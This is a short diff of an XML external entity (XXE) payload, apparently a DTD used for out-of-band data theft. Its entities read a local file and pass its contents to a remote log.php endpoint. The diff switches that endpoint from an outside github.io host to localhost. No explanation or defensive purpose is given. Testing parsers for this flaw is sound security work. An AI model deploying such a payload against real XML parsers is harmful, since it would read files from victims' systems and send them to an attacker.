@@ -1,6 +1,6 @@
 <!ENTITY % payload SYSTEM "file:///c:/vulnerableFileInDesktop.txt">
 <!ENTITY % param1 '<!ENTITY &#37; external SYSTEM 
-"http://craftart.github.io/log.php?%payload;" >'
+"http://localhost:8080/log.php?%payload;" >'
 >
 
 %param1;
